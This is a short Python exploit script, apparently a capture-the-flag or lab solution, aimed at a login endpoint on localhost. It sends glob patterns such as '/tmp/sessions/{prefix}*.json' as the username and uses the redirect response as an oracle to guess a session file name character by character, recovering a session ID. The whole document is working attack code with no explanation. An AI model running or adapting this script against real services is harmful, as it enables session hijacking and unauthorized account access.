import string
import requests

s = requests.Session()

HOST = "http://localhost:8000"


def login(username, password=""):
    r = s.post(HOST + "/login",
               data={"username": username, "password": password},
               allow_redirects=False)
    return r.status_code == 302


session = ""
for i in range(32):
    # This step can be improved with multithreading
    for c in string.ascii_letters + string.digits + "_-":
        if login(f"/tmp/sessions/{session}{c}*.json"):
            session += c
            print(session)
            break
    else:
        raise Exception("Failed to find next character")

print(f"Found session: {session}")
